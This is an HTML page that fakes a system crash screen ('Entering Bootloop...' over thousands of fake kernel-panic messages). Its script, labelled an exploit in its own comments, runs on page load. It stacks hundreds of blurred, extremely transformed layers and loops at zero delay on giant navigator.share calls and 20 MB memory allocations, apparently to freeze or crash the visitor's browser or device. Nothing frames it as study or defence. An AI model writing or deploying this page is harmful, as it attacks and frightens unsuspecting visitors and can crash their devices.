<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FAIL</title>
    <style>
        body {
            background: #450a0a; /* Dark red from section phase in second.html */
            color: #ffffff;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-content: flex-start;
            height: 100vh;
            width: 100vw;
        }
        .error-msg {
            font-size: 8px;
            opacity: 0.5;
            white-space: nowrap;
            user-select: none;
            padding: 2px;
        }
    </style>
</head>
<body>
    <div style="position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 100; pointer-events: none;">
        <div style="background: rgba(0,0,0,0.8); padding: 20px 40px; border: 2px solid #fff; color: #fff; font-size: 24px; font-weight: bold; border-radius: 10px; box-shadow: 0 0 50px rgba(0,0,0,1);">
            Entering Bootloop...
        </div>
    </div>

    <script>
        // Fill background with small error messages - pushed to 3000 for total coverage
        const errorTemplates = [
            "Fatal Error 0x3333",
            "KERNEL_PANIC",
            "OVERFLOW_DETECTION",
            "STACK_COLLISION",
            "MEMORY_CORRUPTION",
            "0xFFFF_SYSTEM_HALT",
            "CRITICAL_PROCESS_DIED",
            "THREAD_STUCK_IN_DEVICE_DRIVER",
            "BOOT_LOOP_DETECTED",
            "FS_CORRUPTION"
        ];
        
        // Generating massive amount of elements to ensure zero gaps
        for(let i=0; i<3000; i++) {
            const span = document.createElement('span');
            span.className = 'error-msg';
            span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
            document.body.appendChild(span);
        }

        // Directly executing the exploit in the top level for maximum effect
        function startExploit() {
            const container = document.createElement('div');
            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
            document.body.appendChild(container);

            for (let i = 0; i < 500; i++) {
                let d = document.createElement('div');
                d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99; pointer-events: none;';
                container.appendChild(d);
            }

            setInterval(() => {
                try {
                    navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                } catch(e) {}
                let x = new Uint8Array(1024 * 1024 * 20);
                crypto.getRandomValues(x);
            }, 0);
        }

        // Start immediately on load
        window.onload = startExploit;
    </script>
</body>
</html>
